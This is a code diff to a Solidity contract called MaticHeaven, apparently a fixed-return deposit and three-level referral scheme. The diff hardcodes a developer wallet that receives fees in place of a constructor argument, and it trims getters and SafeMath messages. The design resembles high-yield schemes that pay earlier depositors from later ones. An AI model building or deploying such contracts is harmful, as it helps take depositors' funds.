@@ -56,18 +56,16 @@ contract MaticHeaven {
     event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
     event FeePaid(address indexed user, uint256 totalAmount);
 
-    constructor(address payable devAddr, uint256 start) public {
-        require(!isContract(devAddr));
-        devWallet = devAddr;
+    constructor(uint256 start) public {
+        devWallet = 0xf301f2193FEAdd6397d97f898214BdE58ebFE21C;
 
-        if(start>0){
+        if(start > 0) {
             startDate = start;
-        }
-        else{
+        } else {
             startDate = block.timestamp;
         }
 
-        plans.push(Plan(8,  170));
+        plans.push(Plan(8, 170));
         plans.push(Plan(60, 70));
     }
 
@@ -109,7 +107,7 @@ contract MaticHeaven {
                     upline = users[upline].referrer;
                 } else break;
             }
-        }else{
+        } else {
             uint256 amount = msg.value.mul(TOTAL_REF).div(PERCENTS_DIVIDER);
             devWallet.transfer(amount);
             totalReferral = totalReferral.add(amount);
@@ -141,7 +139,7 @@ contract MaticHeaven {
 
         require(totalAmount >= WITHDRAW_MIN_AMOUNT, "withdraw min amount is not reached");
 
-        if(user.deposits.length < 100) {
+        if (user.deposits.length < 100) {
             uint256 reinvest_amount = totalAmount.mul(REINVEST_ON_WITHDRAWAL).div(PERCENTS_DIVIDER);
             totalAmount = totalAmount.sub(reinvest_amount);
             reinvestOnWithdraw(1, reinvest_amount);
@@ -156,7 +154,7 @@ contract MaticHeaven {
     function reinvest(uint8 plan) public {
         User storage user = users[msg.sender];
         (uint256 totalAmount1, uint256 totalAmount2) = getUserDividendsOnReinvest(msg.sender);
-        if( totalAmount2 > 0 && plan == 1){
+        if (totalAmount2 > 0 && plan == 1) {
             totalAmount2 = totalAmount2.add(totalAmount2.mul(REINVEST_BONUS).div(PERCENTS_DIVIDER));
         }
         uint256 totalAmount = totalAmount1.add(totalAmount2);
@@ -223,10 +221,10 @@ contract MaticHeaven {
         return totalAmount;
     }
 
-    function getUserDividendsOnReinvest(address userAddress) public view returns (uint256,uint256) {
+    function getUserDividendsOnReinvest(address userAddress) public view returns (uint256, uint256) {
         User storage user = users[userAddress];
-        uint256 totalAmountPlan1;
-        uint256 totalAmountPlan2;
+        uint256 totalAmount1;
+        uint256 totalAmount2;
         for (uint256 i = 0; i < user.deposits.length; i++) {
             uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
             if (user.checkpoint < finish) {
@@ -234,20 +232,15 @@ contract MaticHeaven {
                 uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
                 uint256 to = finish < block.timestamp ? finish : block.timestamp;
                 if (from < to) {
-                    
-                    if(user.deposits[i].plan == 0){
-                        totalAmountPlan1 = totalAmountPlan1.add(share.mul(to.sub(from)).div(TIME_STEP));
-                    } else if(user.deposits[i].plan == 1){
-                        totalAmountPlan2 = totalAmountPlan2.add(share.mul(to.sub(from)).div(TIME_STEP));
+                    if (user.deposits[i].plan == 0) {
+                        totalAmount1 = totalAmount1.add(share.mul(to.sub(from)).div(TIME_STEP));
+                    } else {
+                        totalAmount2 = totalAmount2.add(share.mul(to.sub(from)).div(TIME_STEP));
                     }
                 }
             }
         }
-        return (totalAmountPlan1, totalAmountPlan2);
-    }
-
-    function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
-        return users[userAddress].withdrawn;
+        return (totalAmount1, totalAmount2);
     }
 
     function getUserCheckpoint(address userAddress) public view returns(uint256) {
@@ -258,12 +251,8 @@ contract MaticHeaven {
         return users[userAddress].referrer;
     }
 
-    function getUserDownlineCount(address userAddress) public view returns(uint256[3] memory referrals) {
-        return (users[userAddress].levels);
-    }
-
-    function getUserTotalReferrals(address userAddress) public view returns(uint256) {
-        return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2];
+    function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256) {
+        return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2]);
     }
 
     function getUserReferralBonus(address userAddress) public view returns(uint256) {
@@ -294,60 +283,45 @@ contract MaticHeaven {
 
     function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
         User storage user = users[userAddress];
-
         plan = user.deposits[index].plan;
-        percent = plans[plan].percent;
+        percent = plans[user.deposits[index].plan].percent;
         amount = user.deposits[index].amount;
         start = user.deposits[index].start;
         finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
     }
 
-    function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus, uint256 _contractBalance) {
-        return(totalInvested, totalReferral, getContractBalance());
-    }
-
-    function getUserInfo(address userAddress) public view returns(uint256 checkpoint, uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
-        return(getUserCheckpoint(userAddress), getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
-    }
-
     function isContract(address addr) internal view returns (bool) {
-        uint size;
+        uint256 size;
         assembly { size := extcodesize(addr) }
         return size > 0;
     }
 }
 
 library SafeMath {
-
-    function add(uint256 a, uint256 b) internal pure returns (uint256) {
-        uint256 c = a + b;
-        require(c >= a, "SafeMath: addition overflow");
-
-        return c;
-    }
-
-    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
-        require(b <= a, "SafeMath: subtraction overflow");
-        uint256 c = a - b;
-
-        return c;
-    }
-
     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
         if (a == 0) {
             return 0;
         }
-
         uint256 c = a * b;
-        require(c / a == b, "SafeMath: multiplication overflow");
-
+        require(c / a == b);
         return c;
     }
 
     function div(uint256 a, uint256 b) internal pure returns (uint256) {
-        require(b > 0, "SafeMath: division by zero");
+        require(b > 0);
         uint256 c = a / b;
+        return c;
+    }
 
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        require(b <= a);
+        uint256 c = a - b;
+        return c;
+    }
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a);
         return c;
     }
 }
